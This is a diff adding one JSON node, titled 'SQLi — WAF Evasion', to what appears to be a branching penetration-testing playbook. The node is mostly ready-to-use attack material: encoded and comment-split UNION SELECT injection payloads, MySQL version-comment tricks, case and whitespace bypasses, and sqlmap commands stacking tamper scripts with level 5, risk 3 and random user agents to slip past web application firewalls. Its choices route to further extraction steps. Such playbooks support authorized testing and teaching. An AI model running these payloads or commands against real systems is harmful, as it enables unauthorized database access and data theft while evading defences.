@@ -1,0 +1,22 @@
+{
+  "id": "sqli_waf",
+  "phase": "WEB",
+  "title": "SQLi — WAF Evasion",
+  "body": "WAF pattern-matching keywords and characters. PortSwigger: evasion uses encoding, comment injection, case variation, and whitespace alternatives to break patterns without breaking SQL syntax.",
+  "cmd": "# -- DETECT WAF ---------------------------\nwafw00f http://$ip\n# 403/406/501 on SQL payloads = WAF active\n\n# -- ENCODING BYPASSES --------------------\n# URL encode critical chars\n%27 = '     %20 = space     %2D%2D = --\n# Double encode\n%2527 = %27 = '\n\n# Hex string encoding (MySQL)\n0x61646d696e = 'admin'\n' UNION SELECT NULL,0x61646d696e,NULL--\n\n# -- COMMENT INJECTION --------------------\n# Break keywords with inline comments\nUN/**/ION SEL/**/ECT NULL,version(),NULL--\n' UN/**/ION SEL/**/ECT NULL,version(),NULL--\n\n# MySQL version comments\n/*!UNION*/ /*!SELECT*/ NULL,version(),NULL--\n/*!50000 union*/ /*!50000 select*/ NULL,version(),NULL--\n\n# -- CASE + SPACE VARIATION ---------------\nuNiOn SeLeCt\nUnIoN aLl SeLeCt\n\n# Space substitutes: /**/ %09(tab) %0a(newline) %0d +\n'%09UNION%09SELECT%09NULL,version(),NULL--\n\n# -- SQLMAP TAMPER SCRIPTS ----------------\nsqlmap -u \"http://$ip/page?id=1\"   --tamper=space2comment,between,randomcase,charencode   --random-agent --delay=1 --batch --level=3\n\n# Common tampers:\n# space2comment  — spaces → /**/\n# between        — > → BETWEEN x AND y\n# randomcase     — random keyword casing\n# charencode     — URL encode payload\n# unmagicquotes  — bypass magic quote escaping\n# base64encode   — base64 the payload\n\n# Aggressive evasion stack:\nsqlmap -u \"http://$ip/page?id=1\"   --tamper=space2comment,charencode,between,randomcase   --random-agent --delay=2 --retries=3   --batch --level=5 --risk=3",
+  "warn": "Aggressive scanning gets you rate-limited or blocked entirely. Add --delay=2 to sqlmap. Slow + encoded > fast + obvious against a WAF.",
+  "choices": [
+    {
+      "label": "Bypass worked — UNION extraction",
+      "next": "sqli_union"
+    },
+    {
+      "label": "Bypass worked — sqlmap running",
+      "next": "sqli_sqlmap"
+    },
+    {
+      "label": "WAF too aggressive — different param",
+      "next": "sqli_blind"
+    }
+  ]
+}
